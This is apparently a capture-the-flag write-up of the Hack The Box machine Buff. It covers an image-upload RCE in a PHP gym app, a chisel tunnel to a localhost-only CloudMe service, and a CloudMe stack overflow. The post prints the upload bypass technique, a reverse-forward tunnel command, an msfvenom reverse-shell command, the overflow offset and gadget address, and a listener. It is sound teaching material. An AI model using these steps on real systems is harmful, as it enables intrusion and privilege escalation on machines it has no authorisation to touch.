---
layout: post
title: "The Gym That Spotted You"
subtitle: "HTB Buff, where a fitness app accepts a photo that is secretly a shell, and the road to admin runs through a tunnel to a service that only ever talks to itself"
date: 2020-11-28 12:00:00 +0000
description: "A gym app takes a picture that is really code, then a cloud-sync tool that only listens to localhost gets reached through a tunnel and overflowed into Administrator."
image: /assets/og/the-gym-that-spotted-you.png
tags: [hackthebox, writeup]
---

Buff is a fitness website that wants to help you, and that eagerness is the entire problem. The site runs a free PHP gym-management app that lets anyone, logged in or not, upload a profile photo. It does not look very hard at what a photo actually is. So you hand it a picture that happens to also be code, and the server runs the code. That drops you onto the box as a low user named shaun, and from there the box turns into a smaller, stranger puzzle. A cloud-sync program is running on the machine, but it refuses to talk to anyone except the machine itself. You cannot reach it from outside. So you dig a tunnel back through your own foothold, knock on the door from the inside, and feed that program a string so long it forgets where its own return address lives. The program falls over, and on the way down it hands you Administrator. No memory-corruption wizardry on the front door. Just an app that trusted a filename and a service that trusted that nobody on its own host would ever be unkind.

```
        B U F F   F I T N E S S
        =======================
        upload.php   "send me a profile pic"
        you send:    kaio-ken.php.png   (a photo on the outside,
                                          a shell on the inside)
                          |
                          v
        you are shaun now. low, but inside.
                          |
        netstat:   127.0.0.1:8888  LISTENING   (CloudMe, talks only
                                                to itself)
                          |
        dig a tunnel home, knock from the inside,
        and hand it 1052 bytes too many.
        it falls over wearing the admin's badge.
                                            筋
```

## 0x01 · the front desk

Two ports answer, and the interesting one is high and wide open. A quick `nmap -sC -sV` over the box comes back almost empty.

```
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
```

That `Win64` and `PHP/7.4.6` tell you the whole shape of the thing. This is a Windows box running an Apache and PHP stack of the kind people drop on a server because a tutorial told them to, not because they hardened anything. Port 7680 is Windows Delivery Optimization, the peer-to-peer update gossip service, and it is noise. The website on 8080 is the target.

Browse it and you get a gym. Class schedules, a contact page, the usual stock photos of people lifting things. The page worth reading slowly is the footer and the contact form, because they name the software out loud. This is **Gym Management System 1.0**, a free PHP app, and a `README.md` sitting at the web root confirms it without you even having to ask. The moment a box hands you the exact name and version of an off-the-shelf app, your next move is not to think harder. It is to go look up what is already broken about it.

## 0x02 · the photo that was a shell

Gym Management System 1.0 has a public unauthenticated remote code execution bug, written up as exploit-db entry 48506 by Bobby Cooke. There is no CVE on it, just an exploit and a clear explanation, and the explanation is the kind of mistake that gets made a thousand times a day.

Here is what the app does wrong. It has an `upload.php` endpoint that takes a file, and it tries to make sure you can only upload images. But it checks the wrong things, and it checks them badly. It looks at the very end of the filename, and it looks at the `Content-Type` header your browser claims, and it peeks at the first few bytes of the file. Every one of those three checks is something the person uploading gets to control.

Picture a bouncer who decides whether you are a photograph by reading the last word on your name tag, listening to you say "I am a photograph," and glancing at the first sentence of your resume. If your tag ends in `.png`, you say the magic words, and your resume opens with the right hello, he waves you through. He never actually looks at you. So you walk in as a photograph and immediately start behaving like a program.

The exploit builds exactly that disguise. It names the file `kaio-ken.php.png`, a double extension, so the bouncer's glance at the tail sees `.png` while the server, when it finally runs the thing, sees `.php`. It sets the `Content-Type` header to `image/png` by hand. And it stuffs the real PNG magic bytes at the very front of the file so the byte-peek is satisfied.

```
89 50 4E 47 0D 0A 1A      <- the PNG file signature, the "hello i am a photo"
<?php [ one-line webshell: run the 'telepathy' request parameter ] ?>
```

Below the fake photo header sits a tiny PHP webshell. I am not printing a working one, and that restraint is the lesson, not me being coy. A one-line PHP backdoor is about four words long, and the instant the real string touches a disk any half-decent antivirus quarantines the file as malware, which is the funniest possible proof of how loaded those four words are. So picture it. The shell reads one request parameter, the exploit names it `telepathy`, and runs whatever you put there as a shell command.

Fire the exploit and you get an interactive prompt.

```
$ python3 48506.py http://10.10.10.198:8080/
            __     __                       
   _______ / /__  / /__ ___  ___ ____  ___  __ __
  / __/ -_) / _ \/ / -_) _ \/ _ `/ _ \/ _ \/ // /
  \__/\__/_/ .__/_/\__/ .__/\_,_/_//_/_//_/\_, /
          /_/        /_/                  /___/   Gym Management 1.0 RCE

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
buff\shaun
```

You are `shaun`, a normal Windows user, standing inside the web directory. The front door is done, and it never involved a single clever trick. It involved an app that asked "are you a photo" three times and believed every answer.

## 0x03 · the service that only talks to itself

`shaun` is not an administrator, so you start reading the room. Drop your user agent for a real shell, look at what is running, and one line of `netstat` stops you cold.

```
C:\> netstat -ano | findstr LISTENING
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2820
```

Something is listening on port 8888, but only on `127.0.0.1`, the loopback address. That is the machine's private internal phone line. A service bound to `127.0.0.1` will answer the host it lives on and refuse every connection from the outside world. That is precisely why your nmap never saw it. Match the process ID against the task list and look in shaun's `Downloads` folder, and the culprit names itself.

```
C:\Users\shaun\Downloads> dir
11/16/2020  03:19 PM    17,830,824 CloudMe_1112.exe
```

**CloudMe 1.11.2**, a personal cloud-sync client, sitting at version 1.11.2, which has a well-known stack buffer overflow. Two facts now sit side by side. There is a remotely exploitable service on this box, and there is a wall between you and it, because it only listens to localhost.

## 0x04 · the tunnel home

The wall is the interesting part, so think about what loopback really means. CloudMe will happily take a connection from anyone standing inside the house. The problem is you are standing in the yard, shouting at a window that only opens for people in the kitchen. The fix is not to break the window. It is to walk in through the door you already have, the shaun shell, and open the window from the inside.

That is a tunnel. Think of it like a drinking straw pushed through your existing foothold. You pour a connection in your end, and it comes out the far end already inside the box, where loopback considers it a local friend. The tool of choice here is `chisel`, which puts a relay on both ends.

Run the server on your own machine, then run the client on Buff pointed back at you, asking it to reverse-forward the box's local 8888 out to your side.

```
# on 10.10.14.4
$ ./chisel server -p 8000 --reverse

# on Buff, as shaun (binary signed iceberg, dropped in a writable dir)
C:\> .\iceberg.exe client 10.10.14.4:8000 R:8888:127.0.0.1:8888
```

Now anything you send to port 8888 on your own attack box gets carried through the straw and delivered to CloudMe as if a local process knocked. The wall is still standing. You just stopped trying to climb it and went around through a door you were already holding open.

```
        you (10.10.14.4)            Buff (10.10.10.198)
        ----------------            -------------------
        connect 8888  --->  chisel straw  --->  127.0.0.1:8888
                                                 (CloudMe thinks
                                                  it's a local call)
```

## 0x05 · the 1052 bytes too many

Now the overflow itself, exploit-db entry 48389. A buffer overflow is the oldest hardware-level mistake in the catalog, and CloudMe 1.11.2 commits it in textbook form.

Here is the idea in plain terms. When a program calls a function, it writes down, on a scratchpad called the stack, the address it should jump back to when the function finishes. Right next to that note, it reserves a little space to hold the input it is working on. CloudMe reserves that space and then never checks whether your input actually fits. So you send more than fits, the input spills past its little box, and it keeps writing right over the return-address note.

Think of it like a form with a one-line box for your name and a separate box below it that says "mail the finished form to this address." If you write a name long enough to run off the end of its line and keep going, your pen scribbles down into the address box and overwrites it. When the clerk finishes, he does not mail the form back to the office. He mails it wherever your overrun pen happened to land. Control where it lands, and you control where the program goes next.

For CloudMe the name box overflows after exactly **1052 bytes**. Byte 1053 onward is the return address. So you build a payload in three parts: 1052 bytes of junk to fill the box, then four bytes that point at a `PUSH ESP; RET` instruction inside a loaded module (the address sits at `0x68A842B5`), then your shellcode. That gadget is a little trampoline. It bounces execution onto the stack, right where your shellcode is waiting.

Generate the shellcode with the bad bytes filtered out, because a null byte or a newline mid-payload truncates the whole thing.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -b '\x00\x0a\x0d' -f python -v payload

# payload skeleton:
#   buf  = b"A" * 1052
#   buf += pack("<I", 0x68A842B5)   # push esp ; ret  -> the trampoline
#   buf += b"\x90" * 30             # NOP cushion
#   buf += payload                  # [ reverse shell back to 10.10.14.4:443 ]
```

Start a listener, point the script at your own forwarded port 8888 (the near end of the straw), and fire.

```
$ nc -lvnp 443
$ python3 48389.py

listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.198]
C:\Windows\system32> whoami
buff\administrator
```

CloudMe was running with full privileges, so when it fell over, it fell over as Administrator, and the shell you caught wears that badge.

```
C:\> type C:\Users\shaun\Desktop\user.txt
████████████████████████████████
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

It is easy to read Buff as two unrelated tricks, a sloppy web app and a buggy download. They are the same trust failure twice. The upload form trusted the file to honestly describe itself, and a file will lie about every single thing it is asked, because the person sending it controls every byte. The CloudMe service trusted that nobody on its own host would ever be hostile, which is why it felt safe binding to loopback and skipping the length check. Both bets assumed the attacker would politely stay outside. The whole box is what happens when the attacker is already in the building.

The loopback assumption is the one I would lose sleep over. People treat "it only listens on 127.0.0.1" like a lock, and it is not a lock, it is a hope. The second anyone lands even the lowest-privilege shell on that host, every loopback-only service becomes a front door, because to loopback the attacker is now a local friend. Buff stacks those two layers exactly. The web bug gets you a body inside the house, and the privesc is just that body walking to a window the service believed only insiders could ever reach. A buffer overflow gets patched on a Tuesday. The instinct that says "internal-only means safe" is the part that needs to die, and it does not ship in a patch.

## 0x07 · outro

```
the app asked if you were a photo. you said yes three times and walked in.
the service only spoke to the house. so you became the house.
the form had a one-line box. you wrote a thousand-line name
        and signed it over the return address.

two bets, both that the stranger would stay outside.
the stranger was already in the kitchen.

never trust a file's word. never call loopback a wall. wear black.

                                                            EOF
```

---

*HTB: Buff, retired 21 Nov 2020. An easy Windows box that is really a lesson about trust drawn at the wrong boundary. A file that lied about being a picture, and a service that thought its own front porch was the whole world. The straw still reaches the kitchen in a lab and nowhere you don't own.*